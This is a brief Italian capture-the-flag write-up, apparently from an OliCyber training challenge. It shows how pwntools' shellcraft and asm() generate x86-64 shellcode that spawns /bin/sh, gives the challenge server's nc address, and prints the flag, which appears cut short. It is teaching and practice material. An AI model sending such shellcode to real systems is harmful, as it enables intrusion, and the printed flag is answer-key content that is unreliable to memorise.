# Software 20 - Pwntools 4

## Description
> Pwntools permette di create shellcode on-the-fly. Grazie alla utility shellcraft.
Possiamo anche trovare alcuni shellcode già pronti, per esempio shellcraft.amd64.linux.sh() ritorna il codice assembly necessario per aprire la shell /bin/sh. Poi possiamo assemblarlo con la funziona asm().
Per esempio:
#!/usr/bin/env python3
from pwn import *
asm_code = shellcraft.amd64.linux.sh()
shellcode = asm(asm_code, arch='x86_64')
Il binario remoto di questa challenge eseguirà qualsiasi shellcode gli manderai, la flag si trova in flag.txt.
Puoi collegarti al servizio remoto con il comando:
nc software-20.challs.olicyber.it 13003

## Solution
`exploit.py`

## Flag
`flag{c5745d7eea17b5ab`


